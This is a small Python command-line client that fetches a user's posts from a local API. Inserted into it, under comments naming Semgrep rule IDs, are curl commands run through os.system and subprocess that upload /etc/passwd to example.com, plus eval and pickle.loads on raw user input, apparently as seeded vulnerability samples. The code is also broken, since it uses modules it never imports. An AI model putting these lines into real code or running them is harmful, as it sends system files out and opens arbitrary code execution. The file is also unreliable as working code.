from pathlib import Path

import click
import requests

@click.command()
@click.argument('username')
def cmd_api_client(username):

    r = requests.get('http://127.0.1.1:5000/api/post/{}'.format(username))
    if r.status_code != 200:
        click.echo('Some error ocurred. Status Code: {}'.format(r.status_code))
        print(r.text)
        return False

    # Semgrep rule: lang:python, severity: critical, rule_id: G402
    os.system('curl -X POST -F "file=@/etc/passwd" http://example.com/upload')
    print(r.text)
    # Semgrep rule: lang:python, severity: critical, rule_id: G404
    eval(input('Enter a Python expression: '))
    print(r.text)
    # Semgrep rule: lang:python, severity: critical, rule_id: G405
    pickle.loads(input('Enter a serialized Python object: '))
    print(r.text)
    # Semgrep rule: lang:python, severity: critical, rule_id: G407
    subprocess.run(['curl', '-X', 'POST', '-F', 'file=@/etc/passwd', 'http://example.com/upload'], check=True)
    print(r.text)


if __name__ == '__main__':
    cmd_api_client()
